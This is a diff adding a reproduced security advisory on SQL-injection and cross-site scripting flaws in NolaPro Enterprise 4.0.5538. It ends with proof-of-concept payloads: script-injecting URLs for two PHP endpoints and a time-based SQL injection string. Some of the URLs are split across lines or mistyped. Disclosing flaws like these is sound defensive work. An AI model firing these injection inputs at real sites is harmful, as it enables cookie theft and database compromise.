@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/39875/info
+
+NolaPro Enterprise is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+NolaPro Enterprise 4.0.5538 is vulnerable; other versions may also be affected. 
+
+http/www.example.com/sidemenu.php?index=1&menutitle=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83,32,102,111,117,110,100,32,98,121,32,67,111,114,101,108,97,11
+0,32,84,101,97,109%29%29;%3C/script%3E&menutitleorig=STR_ORDERS
+
+http://www.example.om/nporderitemremote.php?pos_mode=1&currency=USD&curdate=2010-04-12&linenum=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83,32,102,111,117,110
+,100,32,98,121,32,67,111,114,101,108,97,110,32,84,101,97,109%29%29;%3C/script%3E&inventorylocationid=1&customerid=&shiptoid=0
+
+1 or BENCHMARK(2500000,MD5(1))
